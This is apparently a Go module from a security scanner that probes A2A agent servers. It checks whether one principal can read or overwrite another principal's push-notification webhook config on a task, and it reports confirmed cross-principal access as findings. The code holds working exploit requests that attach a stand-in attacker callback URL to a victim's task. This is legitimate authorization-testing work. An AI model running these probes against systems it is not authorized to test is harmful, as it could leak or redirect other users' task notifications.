package a2a

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/calbebop/batesian/internal/attack"
)

// PushBindingExecutor checks task ownership on push-config reads and writes.
type PushBindingExecutor struct {
	rule attack.RuleContext
}

func init() {
	attack.Register("a2a-push-binding", func(rc attack.RuleContext) attack.Executor {
		return NewPushBindingExecutor(rc)
	})
}

func NewPushBindingExecutor(r attack.RuleContext) *PushBindingExecutor {
	return &PushBindingExecutor{rule: r}
}

func (e *PushBindingExecutor) Produces() []attack.ArtifactKind { return nil }

func (e *PushBindingExecutor) Requires() []attack.ArtifactKind {
	return []attack.ArtifactKind{attack.ArtifactTaskID}
}

func (e *PushBindingExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	return e.ExecuteChained(ctx, target, opts, attack.NewBlackboard())
}

func (e *PushBindingExecutor) ExecuteChained(ctx context.Context, target string, opts attack.Options, bb *attack.Blackboard) ([]attack.Finding, error) {
	// Cross-principal checks require two identities.
	a, b, err := twoPrincipals(opts)
	if err != nil {
		return nil, err
	}

	vars := attack.NewVars(target, opts.OOBListenerURL)
	endpoint, ok := resolveA2AEndpoint(ctx, attack.NewUnauthHTTPClient(opts, vars), vars.BaseURL)
	if !ok {
		return nil, attack.ErrInconclusive
	}
	clientA := principalClient(opts, vars, a)
	clientB := principalClient(opts, vars, b)
	unauthClient := attack.NewUnauthHTTPClient(opts, attack.NewVars(target, opts.OOBListenerURL))

	// Establish a task owned by A.
	taskID, consumed := e.ownedTask(bb, a)
	var obs setupObservation
	if taskID == "" {
		taskID, obs = e.createTask(ctx, clientA, endpoint, a, vars.RandID)
	}
	if taskID == "" {
		// No owner task means the binding was not tested.
		return nil, obs.err()
	}

	// Require a stored owner config before testing access by B.
	markerURL := "https://batesian-victim-" + vars.RandID + ".example/cb"
	markerTok := "victim-tok-" + vars.RandID
	ownerSet := e.setPush(ctx, clientA, endpoint, a.Headers, "configuring the task owner's push-notification webhook",
		taskID, markerURL, markerTok, "owner-"+vars.RandID, vars.RandID)
	if !ownerSet.accepted {
		return nil, ownerSet.obs.err()
	}
	if !e.getPush(ctx, clientA, endpoint, a.Headers, taskID, ownerSet, markerURL, vars.RandID+"-owner") {
		return nil, attack.ErrInconclusive
	}

	// An accepted anonymous write only rules out a binding bug if it persists.
	openURL := "https://batesian-open-" + vars.RandID + ".example/cb"
	openSet := e.setPush(ctx, unauthClient, endpoint, nil, "configuring a push-notification webhook anonymously",
		taskID, openURL, "x", "open-"+vars.RandID, vars.RandID)
	if openSet.accepted && e.getPush(ctx, clientA, endpoint, a.Headers, taskID, openSet, openURL, vars.RandID+"-open") {
		return nil, nil
	}
	if !e.getPush(ctx, clientA, endpoint, a.Headers, taskID, ownerSet, markerURL, vars.RandID+"-baseline") {
		return nil, attack.ErrInconclusive
	}

	// Read before writing so B can observe A's original config.
	var findings []attack.Finding
	if e.getPush(ctx, clientB, endpoint, b.Headers, taskID, ownerSet, markerURL, vars.RandID+"-cross-read") {
		findings = append(findings, e.readFinding(endpoint, a, b, taskID, markerURL, consumed))
	}
	attackerURL := "https://batesian-attacker-" + vars.RandID + ".example/cb"
	attackerSet := e.setPush(ctx, clientB, endpoint, b.Headers, "configuring a push-notification webhook as principal "+b.Name,
		taskID, attackerURL, "attacker-tok-"+vars.RandID, "attacker-"+vars.RandID, vars.RandID)
	if attackerSet.accepted && e.getPush(ctx, clientA, endpoint, a.Headers, taskID, attackerSet, attackerURL, vars.RandID+"-cross-write") {
		findings = append(findings, e.writeFinding(endpoint, a, b, taskID, attackerURL, consumed))
	}
	if attackerSet.accepted && len(findings) == 0 {
		return nil, attack.ErrInconclusive
	}
	return findings, nil
}

func (e *PushBindingExecutor) ownedTask(bb *attack.Blackboard, a attack.Principal) (taskID string, consumed bool) {
	for _, art := range bb.ByKind(attack.ArtifactTaskID) {
		if art.Value != "" && art.Principal == a.Name {
			return art.Value, true
		}
	}
	return "", false
}

// Both wire attempts contribute to setup classification.
func (e *PushBindingExecutor) createTask(ctx context.Context, c *attack.HTTPClient, endpoint string,
	p attack.Principal, randID string) (string, setupObservation) {
	var obs setupObservation
	headers := pushBindingHeaders(p.Headers, true)
	resp, err := c.POST(ctx, endpoint, headers, map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      "batesian-pb-create-" + p.Name + "-" + randID,
		"method":  "SendMessage",
		"params": map[string]interface{}{
			"message": map[string]interface{}{
				"role":      1,
				"parts":     []interface{}{map[string]string{"text": "batesian push-binding probe " + randID}},
				"messageId": "batesian-pb-" + p.Name + "-" + randID,
			},
		},
	})
	if err != nil || !resp.IsAccepted() {
		obs.observe(classifyTaskSetup("creating a probe task as principal "+p.Name, endpoint,
			c.PresentsCredential(endpoint), resp))
		resp, err = c.POST(ctx, endpoint, pushBindingHeaders(p.Headers, false), map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      "batesian-pb-create-" + p.Name + "-" + randID,
			"method":  "message/send",
			"params": map[string]interface{}{
				"message": map[string]interface{}{
					"role":      "user",
					"parts":     []interface{}{map[string]string{"kind": "text", "text": "batesian push-binding probe " + randID}},
					"messageId": "batesian-pb-" + p.Name + "-" + randID,
				},
			},
		})
	}
	if err != nil || !resp.IsAccepted() {
		obs.observe(classifyTaskSetup("creating a probe task as principal "+p.Name, endpoint,
			c.PresentsCredential(endpoint), resp))
		return "", obs
	}
	taskID, _ := extractTaskContext(resp.Body)
	if taskID == "" {
		obs.observe(classifyTaskSetup("creating a probe task as principal "+p.Name, endpoint,
			c.PresentsCredential(endpoint), resp))
	}
	return taskID, obs
}

type pushSet struct {
	accepted bool
	v1       bool
	id       string
	obs      setupObservation
}

// setPush tries v1 first, then v0.3. It keeps setup failures for the owner control.
func (e *PushBindingExecutor) setPush(ctx context.Context, c *attack.HTTPClient, endpoint string, extra map[string]string, what, taskID, url, token, configID, randID string) pushSet {
	cfg := map[string]string{"id": configID, "url": url, "token": token}
	attempts := []struct {
		method string
		params map[string]interface{}
	}{
		{"CreateTaskPushNotificationConfig", map[string]interface{}{"taskId": taskID, "id": configID, "url": url, "token": token}},
		{"tasks/pushNotificationConfig/set", map[string]interface{}{"taskId": taskID, "pushNotificationConfig": cfg}},
	}
	var obs setupObservation
	for _, at := range attempts {
		requestID := "batesian-pb-set-" + randID
		headers := pushBindingHeaders(extra, at.method == "CreateTaskPushNotificationConfig")
		resp, err := c.POST(ctx, endpoint, headers, map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      requestID,
			"method":  at.method,
			"params":  at.params,
		})
		if err == nil && resp.IsAccepted() {
			if returned := pushResult(resp.Body, requestID); returned != nil {
				set := pushSet{accepted: true, v1: at.method == "CreateTaskPushNotificationConfig", id: configID}
				if id, _ := returned["id"].(string); id != "" {
					set.id = id
				} else if nested, ok := returned["pushNotificationConfig"].(map[string]interface{}); ok {
					if id, _ := nested["id"].(string); id != "" {
						set.id = id
					}
				}
				return set
			}
		}
		obs.observe(classifyTaskSetup(what, endpoint, c.PresentsCredential(endpoint), resp))
	}
	return pushSet{obs: obs}
}

func pushResult(body []byte, requestID string) map[string]interface{} {
	var envelope struct {
		JSONRPC string                 `json:"jsonrpc"`
		ID      string                 `json:"id"`
		Result  map[string]interface{} `json:"result"`
	}
	if json.Unmarshal(body, &envelope) != nil || envelope.JSONRPC != "2.0" || envelope.ID != requestID {
		return nil
	}
	return envelope.Result
}

func (e *PushBindingExecutor) getPush(ctx context.Context, c *attack.HTTPClient, endpoint string, extra map[string]string, taskID string, set pushSet, expectedURL, randID string) bool {
	method := "tasks/pushNotificationConfig/get"
	params := map[string]interface{}{"id": taskID, "pushNotificationConfigId": set.id}
	if set.v1 {
		method = "GetTaskPushNotificationConfig"
		params = map[string]interface{}{"taskId": taskID, "id": set.id}
	}
	headers := pushBindingHeaders(extra, set.v1)
	requestID := "batesian-pb-get-" + randID
	resp, err := c.POST(ctx, endpoint, headers, map[string]interface{}{
		"jsonrpc": "2.0", "id": requestID,
		"method": method, "params": params,
	})
	if err != nil || !resp.IsAccepted() {
		return false
	}
	result := pushResult(resp.Body, requestID)
	if result == nil {
		return false
	}
	if returnedTask, ok := result["taskId"]; ok && returnedTask != taskID {
		return false
	}
	config := result
	if !set.v1 {
		var ok bool
		config, ok = result["pushNotificationConfig"].(map[string]interface{})
		if !ok {
			return false
		}
		if returnedID, ok := config["id"]; ok && returnedID != set.id {
			return false
		}
	} else if returnedID, ok := result["id"]; ok && returnedID != set.id {
		return false
	}
	return config["url"] == expectedURL
}

func pushBindingHeaders(extra map[string]string, v1 bool) map[string]string {
	headers := make(map[string]string, len(extra)+1)
	for k, v := range extra {
		if !strings.EqualFold(k, "A2A-Version") {
			headers[k] = v
		}
	}
	if v1 {
		headers["A2A-Version"] = "1.0"
	}
	return headers
}

func (e *PushBindingExecutor) writeFinding(endpoint string, owner, attacker attack.Principal, taskID, attackerURL string, consumed bool) attack.Finding {
	return attack.Finding{
		RuleID:     e.rule.ID,
		RuleName:   e.rule.Name,
		Severity:   "high",
		Confidence: attack.ConfirmedExploit,
		Title:      "A2A push-notification config writable across principals",
		Description: fmt.Sprintf(
			"Principal %q attached a push-notification callback (%s) to task %s, which is owned by "+
				"principal %q, using only its own valid credentials. The push control plane is "+
				"authenticated but not bound to the task owner. Notification delivery was not tested.",
			attacker.Name, attackerURL, taskID, owner.Name),
		Evidence: fmt.Sprintf("owner: %s\nattacker: %s\ntask: %s\nowner readback URL: %s\ntask origin: %s",
			owner.Name, attacker.Name, taskID, attackerURL, taskOrigin(consumed)),
		Remediation: e.rule.Remediation,
		TargetURL:   endpoint,
		Chain: []attack.ChainStep{
			{Hop: 1, Principal: owner.Name, Action: "own task " + taskID + " with a configured webhook", Outcome: "task owned by " + owner.Name},
			{Hop: 2, Principal: attacker.Name, Action: "set push config on " + taskID + " (cross-principal)", Outcome: "GRANTED - attacker callback attached"},
		},
	}
}

func (e *PushBindingExecutor) readFinding(endpoint string, owner, attacker attack.Principal, taskID, markerURL string, consumed bool) attack.Finding {
	return attack.Finding{
		RuleID:     e.rule.ID,
		RuleName:   e.rule.Name,
		Severity:   "high",
		Confidence: attack.ConfirmedExploit,
		Title:      "A2A push-notification config readable across principals",
		Description: fmt.Sprintf(
			"Principal %q read the push-notification config of task %s, owned by principal %q, and "+
				"the response disclosed %q's configured callback URL (%s). The callback token was not verified.",
			attacker.Name, taskID, owner.Name, owner.Name, markerURL),
		Evidence: fmt.Sprintf("owner: %s\nattacker: %s\ntask: %s\nleaked callback URL: %s\ntask origin: %s",
			owner.Name, attacker.Name, taskID, markerURL, taskOrigin(consumed)),
		Remediation: e.rule.Remediation,
		TargetURL:   endpoint,
		Chain: []attack.ChainStep{
			{Hop: 1, Principal: owner.Name, Action: "own task " + taskID + " with a configured webhook", Outcome: "callback URL configured (secret)"},
			{Hop: 2, Principal: attacker.Name, Action: "get push config of " + taskID + " (cross-principal)", Outcome: "GRANTED - owner's callback URL disclosed"},
		},
	}
}

func taskOrigin(consumed bool) string {
	if consumed {
		return "reused from upstream blackboard artifact (cross-rule chain)"
	}
	return "created during this scan"
}
